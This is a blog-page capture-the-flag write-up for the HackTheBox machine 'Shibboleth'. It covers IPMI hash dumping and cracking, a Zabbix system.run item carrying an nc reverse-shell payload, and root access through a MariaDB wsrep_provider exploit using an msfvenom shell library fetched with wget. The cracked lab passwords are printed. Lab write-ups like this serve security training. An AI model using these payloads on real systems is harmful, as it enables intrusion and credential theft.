<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Hackthebox Shibboleth Writeup" /><meta property="og:locale" content="en" /><meta name="description" content="Machine name - Shibboleth ( HackTheBox )" /><meta property="og:description" content="Machine name - Shibboleth ( HackTheBox )" /><link rel="canonical" href="https://heapbytes.github.io/posts/Shibboleth/" /><meta property="og:url" content="https://heapbytes.github.io/posts/Shibboleth/" /><meta property="og:site_name" content="heapbytes" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-09T01:30:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Shibboleth Writeup" /><meta name="twitter:site" content="@heapbytes" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"mainEntityOfPage":{"@type":"WebPage","@id":"https://heapbytes.github.io/posts/Shibboleth/"},"description":"Machine name - Shibboleth ( HackTheBox )","url":"https://heapbytes.github.io/posts/Shibboleth/","@type":"BlogPosting","headline":"Hackthebox Shibboleth Writeup","dateModified":"2022-04-09T23:54:41+05:30","datePublished":"2022-04-09T01:30:00+05:30","@context":"https://schema.org"}</script><title>Hackthebox Shibboleth Writeup | heapbytes</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="heapbytes"><meta name="application-name" content="heapbytes"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://c.tenor.com/GmnuOLYMjxUAAAAC/demon-slayer-kimetsu-no-yaiba.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">heapbytes</a></div><div class="site-subtitle font-italic">The more I learn, the more I realise how much I don't know</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/heapbytes" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/heapbytes" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['heapbytes','proton.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Shibboleth Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Shibboleth Writeup</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/heapbytes">heapbytes</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-04-09 01:30:00 +0530" data-toggle="tooltip" data-placement="bottom" title="Sat, Apr 9, 2022, 1:30 AM +0530" >Apr 9, 2022</em> </span> <span> Updated <em class="timeago" date="2022-04-09 23:54:41 +0530 " data-toggle="tooltip" data-placement="bottom" title="Sat, Apr 9, 2022, 11:54 PM +0530" >Apr 9, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1438 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><h1 id="machine-name---shibboleth--hackthebox-">Machine name - Shibboleth ( HackTheBox )</h1><p><img data-src="https://user-images.githubusercontent.com/56447720/141720731-d84cee05-4d93-4365-8326-5f8c3300ceef.png" alt="image" data-proofer-ignore></p><h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>nmap <span class="nt">-p-</span> <span class="nt">-sC</span> <span class="nt">-sV</span> shibboleth.htb
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-15 09:37 IST
Nmap scan report <span class="k">for </span>shibboleth.htb <span class="o">(</span>10.129.99.116<span class="o">)</span>
Host is up <span class="o">(</span>0.20s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: FlexStart Bootstrap Template - Index

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>

</pre></table></code></div></div><p>Hmmm only 1 port is opened, strange, Let’s try scanning UDP ports</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>nmap <span class="nt">-vvv</span> <span class="nt">-T4</span> <span class="nt">-sU</span> shibboleth.htb
Increasing send delay <span class="k">for </span>10.129.98.77 from 0 to 50 due to 11 out of 17 dropped probes since last increase.
Warning: 10.129.98.77 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span><span class="nb">.</span>
Increasing send delay <span class="k">for </span>10.129.98.77 from 200 to 400 due to 11 out of 14 dropped probes since last increase.
Increasing send delay <span class="k">for </span>10.129.98.77 from 400 to 800 due to 11 out of 11 dropped probes since last increase.
Nmap scan report <span class="k">for </span>shibboleth.htb <span class="o">(</span>10.129.98.77<span class="o">)</span>
Host is up, received echo-reply ttl 63 <span class="o">(</span>0.21s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2021-11-14 00:50:23 EST <span class="k">for </span>1076s
Not shown: 993 closed ports
Reason: 993 port-unreaches
PORT      STATE         SERVICE  REASON
623/udp   open          asf-rmcp udp-response ttl 63
5555/udp  open|filtered rplay    no-response
8000/udp  open|filtered irdmi    no-response
21167/udp open|filtered unknown  no-response
30718/udp open|filtered unknown  no-response
49175/udp open|filtered unknown  no-response
49350/udp open|filtered unknown  no-response

Read data files from: /usr/bin/../share/nmap
<span class="c"># Nmap done at Sun Nov 14 01:08:19 2021 -- 1 IP address (1 host up) scanned in 1075.67 seconds</span>
</pre></table></code></div></div><p>…………and yess there are some udp ports open</p><h2 id="directory-scanning">Directory Scanning<a href="#directory-scanning" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>________________________________________________

 :: Method           : GET
 :: URL              : http://zabbix.shibboleth.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : <span class="nb">false</span>
 :: Calibration      : <span class="nb">false</span>
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               <span class="o">[</span>Status: 403, Size: 286, Words: 20, Lines: 10]
.htpasswd               <span class="o">[</span>Status: 403, Size: 286, Words: 20, Lines: 10]
app                     <span class="o">[</span>Status: 301, Size: 328, Words: 20, Lines: 10]
assets                  <span class="o">[</span>Status: 301, Size: 331, Words: 20, Lines: 10]
audio                   <span class="o">[</span>Status: 301, Size: 330, Words: 20, Lines: 10]
conf                    <span class="o">[</span>Status: 301, Size: 329, Words: 20, Lines: 10]
favicon.ico             <span class="o">[</span>Status: 200, Size: 32988, Words: 13, Lines: 3]
fonts                   <span class="o">[</span>Status: 301, Size: 330, Words: 20, Lines: 10]
include                 <span class="o">[</span>Status: 301, Size: 332, Words: 20, Lines: 10]
js                      <span class="o">[</span>Status: 301, Size: 327, Words: 20, Lines: 10]
<span class="nb">local</span>                   <span class="o">[</span>Status: 301, Size: 330, Words: 20, Lines: 10]
locale                  <span class="o">[</span>Status: 301, Size: 331, Words: 20, Lines: 10]
modules                 <span class="o">[</span>Status: 301, Size: 332, Words: 20, Lines: 10]
robots.txt              <span class="o">[</span>Status: 200, Size: 974, Words: 153, Lines: 23]
server-status           <span class="o">[</span>Status: 403, Size: 286, Words: 20, Lines: 10]
vendor                  <span class="o">[</span>Status: 301, Size: 331, Words: 20, Lines: 10]
:: Progress: <span class="o">[</span>20469/20469] :: Job <span class="o">[</span>1/1] :: 328 req/sec :: Duration: <span class="o">[</span>0:01:06] :: Errors: 0 ::
</pre></table></code></div></div><p>After enumerating through these directories I found nothing that was intresting, let’s try getting some subdomains</p><h2 id="subdomain-list">Subdomain List<a href="#subdomain-list" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/wordlists/subdomains/subdomain-1million.txt <span class="nt">-u</span> http://shibboleth.htb/ <span class="nt">-H</span> <span class="s2">"Host: FUZZ.shibboleth.htb"</span> <span class="nt">-mc</span> 200 

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://shibboleth.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/subdomains/subdomain-1million.txt
 :: Header           : Host: FUZZ.shibboleth.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

monitor                 [Status: 200, Size: 3686, Words: 192, Lines: 30]
monitoring              [Status: 200, Size: 3686, Words: 192, Lines: 30]
zabbix                  [Status: 200, Size: 3686, Words: 192, Lines: 30]
</span></pre></table></code></div></div><p>Voila!! we have some subdomains active , let’s add them to /etc/hosts</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span><span class="nb">sudo </span>nano /etc/hosts
<span class="c">#htb machines</span>
10.129.99.116 shibboleth.htb zabbix.shibboleth.htb monitor.shibboleth.htb monitoring.shibboleth.htb
</pre></table></code></div></div><p>All the three subdomain had a login page <img data-src="https://user-images.githubusercontent.com/56447720/141722392-9fbebb36-f73a-4238-8b4b-a59ea0642bb0.png" alt="image" data-proofer-ignore></p><p>Hmmmmmm zabbix</p><blockquote><p>Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk space consumption</p></blockquote><h1 id="get-login-details">Get login details</h1><p>So I tried with some Web Attacks to login but none of them worked, The <strong>UDP port 623</strong> will get us some hashes</p><h3 id="learn">Learn<a href="#learn" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>The UDP port 623 is vulnerable : https://book.hacktricks.xyz/pentesting/623-udp-ipmi</ul><h3 id="login-creds">Login creds<a href="#login-creds" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>I’ve used the Metasplot way to get the hashes because it was easy</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>msf6 auxiliary<span class="o">(</span>scanner/ipmi/ipmi_dumphashes<span class="o">)</span> <span class="o">&gt;</span> use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary<span class="o">(</span>scanner/ipmi/ipmi_dumphashes<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts 10.129.99.116
rhosts <span class="o">=&gt;</span> 10.129.99.116
msf6 auxiliary<span class="o">(</span>scanner/ipmi/ipmi_dumphashes<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>OUTPUT_JOHN_FILE zabbixlogin
OUTPUT_JOHN_FILE <span class="o">=&gt;</span> zabbixlogin
msf6 auxiliary<span class="o">(</span>scanner/ipmi/ipmi_dumphashes<span class="o">)</span> <span class="o">&gt;</span> exploit

<span class="o">[</span>+] 10.129.99.116:623 - IPMI - Hash found: Administrator:97c8d75502010000d824a6d87cc8260b6a7a8ddf0282eadc5ebab7e75f2c8f7ed1a6429124bdf9b3a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:84568da58ac1bb73a12d71bb0ea9d08a470ebd31
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Scanned 1 of 1 hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Auxiliary module execution completed
msf6 auxiliary<span class="o">(</span>scanner/ipmi/ipmi_dumphashes<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">cat </span>zabbixlogin
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">exec</span>: <span class="nb">cat </span>zabbixlogin

10.129.99.116 Administrator:<span class="nv">$rakp$97c8d75502010000d824a6d87cc8260b6a7a8ddf0282eadc5ebab7e75f2c8f7ed1a6429124bdf9b3a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72$84568da58ac1bb73a12d71bb0ea9d08a470ebd31</span>

</pre></table></code></div></div><ul><li>John cracked the password</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt zabbixlogin 
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>RAKP, IPMI 2.0 RAKP <span class="o">(</span>RMCP+<span class="o">)</span> <span class="o">[</span>HMAC-SHA1 256/256 AVX2 8x]<span class="o">)</span>
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
ilovepumkinpie1  <span class="o">(</span>10.129.99.116 Administrator<span class="o">)</span>
1g 0:00:00:02 DONE <span class="o">(</span>2021-11-15 10:10<span class="o">)</span> 0.4201g/s 3139Kp/s 3139Kc/s 3139KC/s in_199..iargxe
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed

└─<span class="nv">$ </span>john  zabbixlogin <span class="nt">--show</span> 
10.129.99.116 Administrator:ilovepumkinpie1

1 password <span class="nb">hash </span>cracked, 0 left
</pre></table></code></div></div><ul><li>So now we have the creds [ Administrator : ilovepumkinpie1 ]</ul><h2 id="initial-foothold">Initial Foothold<a href="#initial-foothold" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>I researched for a bit and found this intresting<ul><li>https://stackoverflow.com/questions/24222086/how-to-run-command-on-zabbix-agents</ul><li>After moving around the website I figured out that ` add items ` was vulnerable</ul><p><img data-src="https://user-images.githubusercontent.com/56447720/141724103-0b775ae7-12af-4136-a0fd-b257ce77ba03.png" alt="image" data-proofer-ignore></p><ul><li>The payload<ul><li><div class="table-wrapper"><table><tbody><tr><td>system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f<td>sh -i 2&gt;&amp;1<td>nc 10.10.10.10 9999 &gt;/tmp/f &amp;,nowait]</table></div></ul></ul><p><img data-src="https://user-images.githubusercontent.com/56447720/141724345-1db0f62e-b04c-44b4-8381-faf76f4510be.png" alt="image" data-proofer-ignore></p><ul><li>Set up a nc listener and get the shell</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>nc <span class="nt">-nvlp</span> 9002
listening on <span class="o">[</span>any] 9002 ...
connect to <span class="o">[</span>10.10.14.47] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.99.116] 40614
sh: 0: can<span class="s1">'t access tty; job control turned off
$ whoami     
zabbix
</span></pre></table></code></div></div><ul><li>As there were no SSH ports open we don’t get any stabalize shell, let’s get work with this shell</ul><h2 id="get-user-flag--escalting-user-privileges">Get User flag / escalting user privileges<a href="#get-user-flag--escalting-user-privileges" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="c"># Use the zabbix login creds to get ipmi-svc user</span>

zabbix@shibboleth<span class="nv">$ </span>su ipmi-svc
password : ilovepumkinpie1

ipmi-svc@shibboleth<span class="nv">$ </span><span class="nb">cat</span> /home/ipmi-svc/user.txt
&lt;<span class="nt">--SNIP--</span><span class="o">&gt;</span>
 
</pre></table></code></div></div><h1 id="escalating-privileges--root-">Escalating privileges [ root ]</h1><h3 id="linpeassh">linpeas.sh<a href="#linpeassh" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>root        1279  0.0  0.0   2608  1856 ?        S    Nov13   0:00 /bin/sh /usr/bin/mysqld_safe
root        1431  0.7  3.7 1727148 150636 ?      Sl   Nov13   6:13  _ /usr/sbin/mysqld <span class="nt">--basedir</span><span class="o">=</span>/usr <span class="nt">--datadir</span><span class="o">=</span>/var/lib/mysql <span class="nt">--plugin-dir</span><span class="o">=</span>/usr/lib/x86_64-linux-gnu/mariadb19/plugin <span class="nt">--user</span><span class="o">=</span>root <span class="nt">--skip-log-error</span> <span class="nt">--pid-file</span><span class="o">=</span>/run/mysqld/m
ysqld.pid <span class="nt">--socket</span><span class="o">=</span>/var/run/mysqld/mysqld.sock
</pre></table></code></div></div><ul><li><p>Hmmm, MySQL is running as root, let’s enumerate</p><li><p>So the DB information was stored in <code class="language-plaintext highlighter-rouge">/etc/zabbix/zabbix_server.conf</code></p></ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>
ipmi-svc@shibboleth:/etc<span class="nv">$ </span><span class="nb">cat</span> /etc/zabbix/zabbix_server.conf | <span class="nb">grep</span> <span class="nt">-C</span> 2 <span class="nt">-i</span> <span class="s2">"password"</span>
&lt;zabbix/zabbix_server.conf | <span class="nb">grep</span> <span class="nt">-C</span> 2 <span class="nt">-i</span> <span class="s2">"password"</span>
<span class="nv">DBUser</span><span class="o">=</span>zabbix

<span class="c">### Option: DBPassword</span>
<span class="c">#	Database password.</span>
<span class="c">#	Comment this line if no password is used.</span>
<span class="c">#</span>
<span class="c"># Mandatory: no</span>
<span class="c"># Default:</span>
<span class="nv">DBPassword</span><span class="o">=</span>bloooarskybluh

</pre></table></code></div></div><ul><li>Now we have the username and password [ zabbix : bloooarskybluh ]</ul><h3 id="mysql-enumeration">MySQL enumeration<a href="#mysql-enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>As <code class="language-plaintext highlighter-rouge">ipmi-svc</code> user was not in the sudoers list GTFO bins is not helpful</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>ipmi-svc@shibboleth:/etc<span class="nv">$ </span>mysql <span class="nt">-V</span>
mysql <span class="nt">-V</span>
mysql  Ver 15.1 Distrib 10.3.25-MariaDB, <span class="k">for </span>debian-linux-gnu <span class="o">(</span>x86_64<span class="o">)</span> using readline 5.2
</pre></table></code></div></div><ul><li>So the version is : 10.3.25</ul><p><img data-src="https://user-images.githubusercontent.com/56447720/141776051-2b5f54fd-50e6-4a8d-8771-d51f34fa1aa0.png" alt="image" data-proofer-ignore></p><ul><li><p>Link : https://www.cvedetails.com/vulnerability-list/vendor_id-12010/Mariadb.html</p><li>The first CVE has 9.0 score [ CVE-2021-27928 ]<li>Let’s get the root</ul><p><img data-src="https://user-images.githubusercontent.com/56447720/141776421-4de72d0d-1aca-410f-840f-df8b7926803a.png" alt="image" data-proofer-ignore></p><ul><li>Link : https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html</ul><h3 id="final-step">Final Step<a href="#final-step" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>Create the reverse shell payload<li><p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf-so -o root.so</port></ip></p><li>I’ve used python http server and wget to download the payload<ul><li>python3 -m http.server 80 [ Attacker ]<li>wget http://<your_ip>/root.so [ Victim ]</your_ip></ul><li>Setup a nc listener</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>
 <span class="c"># Login with creds we got earlier </span>
ipmi-svc@shibboleth:~<span class="nv">$ </span>mysql <span class="nt">-u</span> zabbix <span class="nt">-pbloooarskybluh</span> <span class="nt">-h</span> localhost <span class="nt">-e</span> <span class="s1">'SET GLOBAL wsrep_provider="/tmp/root.so";'</span>
&lt;host <span class="nt">-e</span> <span class="s1">'SET GLOBAL wsrep_provider="/tmp/root.so";'</span>
ERROR 2013 <span class="o">(</span>HY000<span class="o">)</span> at line 1: Lost connection to MySQL server during query

</pre></table></code></div></div><p>## Rooted the machine</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre> 
 └─<span class="nv">$ </span>nc <span class="nt">-nvlp</span> 4433                    
listening on <span class="o">[</span>any] 4433 ...
connect to <span class="o">[</span>10.10.14.47] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.99.153] 49958

python3 <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
root@shibboleth:/var/lib/mysql#id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> 

root@shibboleth:/var/lib/mysql# <span class="nb">cat</span> /root/root.txt
&lt;<span class="nt">--SNIP--</span><span class="o">&gt;</span>

</pre></table></code></div></div><h4 id="box-pwned">Box pwned<a href="#box-pwned" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4><p><img data-src="https://user-images.githubusercontent.com/56447720/141778619-c4e8c92d-47cc-46b7-b212-c7c2bf4785e5.png" alt="image" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>htb</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Shibboleth Writeup - heapbytes&url=https://heapbytes.github.io/posts/Shibboleth/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i 